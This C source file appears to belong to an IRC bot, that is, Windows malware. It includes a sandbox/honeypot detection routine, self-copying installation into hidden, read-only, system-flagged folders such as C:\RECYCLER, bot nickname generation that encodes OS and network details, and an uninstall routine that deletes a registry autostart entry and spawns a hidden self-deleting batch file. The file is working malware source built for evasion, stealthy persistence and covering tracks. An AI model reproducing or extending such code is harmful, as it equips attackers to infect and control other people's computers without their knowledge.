#include "include.h"


BOOL AntiSandBox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser", "nepenthes"};
	DWORD size = 128;
	char szUser[128];
	int i;

	GetUserName(szUser, &size);
	CharLower(szUser);

	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}

	return FALSE;
}

int Bot_Install(unsigned int Type, char FileName[MAX_PATH]) 
{
	char TempDir[MAX_PATH], CopyPath[MAX_PATH], CurrentName[MAX_PATH];
	char *Word;
	FILE *rF, *wF;
	char *Buffer;

	switch (Type) {
	case 1:
		{
			//Type 1:
			//Copy to Program Files//Common Files//System
			if (SUCCEEDED(SHGetFolderPath(NULL, 
										  CSIDL_PROGRAM_FILES_COMMON|CSIDL_FLAG_CREATE, 
									 	  NULL, 
										  0, 
										  TempDir))) {
				_snprintf(CopyPath, sizeof(CopyPath), "%s\\System", TempDir);
				if (CreateDirectory(TempDir, NULL) == 0) {
					if (GetLastError() == ERROR_PATH_NOT_FOUND) {

						_snprintf(BotToCloneDir, sizeof(BotToCloneDir), TempDir);
						_snprintf(CopyPath, sizeof(CopyPath), "%s\\%s", TempDir, FileName);
						break;
					}
				}

				SetFileAttributes(CopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

				_snprintf(BotToCloneDir, sizeof(BotToCloneDir), CopyPath);
				_snprintf(CopyPath, sizeof(CopyPath), "%s\\%s", CopyPath, FileName);

				break;

			} else
				return 0;
		}
	case 2:
		{
			//Type 2:
			//We install this bot into Documents and settings directory, but
			//because theres no function to get it, we will get temp directory
			//first and then strtok it into special words, then combine back
			GetTempPath(sizeof(TempDir), TempDir);

			Word = strtok(TempDir, "\\");

			//If we failed, lets switch to another option
			if (Word == NULL)
				return 0;

			//We have pointer to "C:" in Word now so lets add it to our path
			_snprintf(CopyPath, sizeof(CopyPath), "%s\\", Word);

			//Let's get first map
			Word = strtok(NULL, "\\");
			if (Word == NULL)
				return 0;

			_snprintf(BotToCloneDir, sizeof(BotToCloneDir), "%s%s", CopyPath, Word);
			_snprintf(CopyPath, sizeof(CopyPath), "%s%s\\%s", CopyPath, Word, FileName);

			break;
		}
	case 3:
		{
			//Type 3:
			//We install this bot into C:\\RECYCLER folder,
			//assuming that the folder exists, if not, we create it and set
			//hidden parameter
			_snprintf(TempDir, sizeof(TempDir), "C:\\RECYCLER");

			if (CreateDirectory(TempDir, NULL) == 0) {
				if (GetLastError() == ERROR_PATH_NOT_FOUND)
					//Looks like theres some higher force
					return 0;
			} else
				SetFileAttributes(TempDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

			_snprintf(BotToCloneDir, sizeof(BotToCloneDir), TempDir);
			_snprintf(CopyPath, sizeof(CopyPath), "%s\\%s", TempDir, FileName);

			break;
		}
/*	case 4:
		{
			//Type 4:
			//Install to %windir% (using only if type 1 & type 2 fails)
			GetSystemWindowsDirectory(TempDir, sizeof(TempDir));

			_snprintf(BotToCloneDir, sizeof(BotToCloneDir), TempDir);
			_snprintf(CopyPath, sizeof(CopyPath), "%s\\%s", TempDir, FileName);
			
			break;
		}*/
	}

	//Get name of our current file
	GetModuleFileName(0, CurrentName, sizeof(CurrentName));

#ifdef DEBUG
	printf("Installing to: %s\n", CopyPath);
#endif
	rF = fopen(CurrentName, "rb");
	if (rF == NULL) {
#ifdef DEBUG
		printf("Failed to open (rb): %s\n", CurrentName);
#endif
		return 0;
	}
	wF = fopen(CopyPath, "wb");
	if (wF == NULL) {
		if (strstr(CurrentName, FileName) != NULL) {
#ifdef DEBUG
			printf("File already installed!\n");
#endif
			_snprintf(BotToClone, sizeof(BotToClone), CopyPath);
			SetFileAttributes(CopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
			
			return 2;
		} else {
#ifdef DEBUG
			printf("Failed to open (wb): %s\n", CopyPath);
#endif
			return 0;
		}
	}
	//At this point, we have both files opened, now lets start copying
	Buffer = (char *) malloc (1);
	while (fread(Buffer, 1, 1, rF) == 1) {
		if (fwrite(Buffer, 1, 1, wF) != 1) {
#ifdef DEBUG
			printf("Failed to write to: %s\n", CopyPath);
#endif
			fclose(rF);
			fclose(wF);
			return 0;
		}
	}

	fclose(rF);
	fclose(wF);

	SetFileAttributes(CopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	_snprintf(BotToClone, sizeof(BotToClone), CopyPath);

#ifdef DEBUG
	printf("File installed to: %s\n", CopyPath);
#endif

	return 1;
}

unsigned int Resolve(char *host) {
    struct    hostent    *hp;
    unsigned int    host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(hp == 0) {
            return 0;
        } else host_ip = *(u_int *)(hp->h_addr);
    }

    return(host_ip);
}

char *GenerateLetterNick(int Len, SOCKET Sock) {

	char *Nick;
	int r, i;
	char Buffer[] = "abcdefghijklmnopqrstuvwxyz";
	BOOL UseBuffer = TRUE;

	if (Len == 0) {
		Len = (rand()%5)+5;
		UseBuffer = FALSE;
	}
	
	Nick = (char *) malloc (Len);

	srand(GetTickCount());

	for (i = 0; i < Len; i++) {
		if ((UseBuffer) && (i > 0)) {
			r = rand()%strlen(Buffer);
			Nick[i] = Buffer[r];
		} else {
			r = rand()%26;
			Nick[i] = r+97;
		}
	}

	if (UseBuffer) {
		char c;

		if (PrivateIP(GetIP(Sock)))
			c = '[';
		else
			c = '[';
		Nick[0] = c;
		
		OSVERSIONINFO verinfo;
		verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
		GetVersionEx(&verinfo); 

		if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) 
			c = '1';
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) {
			if (strstr(verinfo.szCSDVersion, "2") != NULL) 
				c = '-';
			else
				c = '-';
		}
		else
			c = '-';

		Nick[1] = 'n';
	    Nick[2] = 'L';
		Nick[3] = 'h';
		Nick[4] = '-';
		Nick[5] = 'V';
		Nick[6] = 'N';
		Nick[7] = 'C';
	    Nick[8] = ']';

	}

	Nick[i] = '\0';

	return Nick;

}

char *GenerateNumberNick(int Len) {

	char *Nick;
	int i;

	Nick = (char *) malloc (Len);
	Nick[0] = '\0';

	srand(GetTickCount());

	for (i = 0; i < Len; i++) {
		sprintf(Nick, "%s%d", Nick, rand()%10);
	}

	Nick[i] = '\0';

	return Nick;
}

char *GetIP(SOCKET Sock) {
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(Sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

int PrepareThreads() {

	unsigned int i;

	for (i = 0; i < MAX_THREADS; i++)
		Thread[i].Type = 0;

	return 1;
}

int AddThread(DWORD Type) {

	unsigned int i = 0;

	while (Thread[i].Type != 0)
		i++;

	if (i >= MAX_THREADS)
		return -1;
	else {
		Thread[i].Type = Type;
		return i;
	}
}

int KillThread(DWORD Type) {

	unsigned int i, k = 0;

	for (i = 0; i < MAX_THREADS; i++) {
		if (Thread[i].Type == Type) {
			TerminateThread(Thread[i].tHandle, 0);
			Thread[i].Type = 0;
			closesocket(Thread[i].Sock);
			k++;
		}
	}

	return k;
}

void KillAllThreads()
{
	unsigned int i;

	for (i = 0; i < MAX_THREADS; i++)
	{
		if (Thread[i].tHandle != NULL)
			TerminateThread(Thread[i].tHandle, 0);
	}
}

int ClearThread(int i) {

	Thread[i].Type = 0;
	closesocket(Thread[i].Sock);

	return 1;
}

int CheckThread(DWORD Type) {

	unsigned int i, k = 0;

	for (i = 0; i < MAX_THREADS; i++)
		if (Thread[i].Type == Type)
			k++;

	return k;
}

BOOL checkos() {

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1 && (strstr(verinfo.szCSDVersion, "2") != NULL)) 
		return TRUE;
	else 
		return FALSE;
}

BOOL PrivateIP(const char *ip) {
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32];
			strncpy(ipbuf, ip, sizeof(ipbuf));
			if ((token=strtok(ipbuf, ".")) != NULL) {
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);

					if ((ip1 == 10)									// Class A Private Network
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	// Class B Private Network
						|| (ip1 == 192 && ip2 == 168))				// Class C Private Network
						return TRUE;
				}
			}
		}
	}
	return FALSE;
}


void Uninstall()
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	KillAllThreads();

	HKEY Reg;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, Decode(string_autostart_location), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Reg, NULL);
	RegDeleteValue(Reg, Decode(string_autostart_description));
	RegCloseKey(Reg);

	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);

	if (f > (HANDLE)0) 
	{
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}

	return;
}
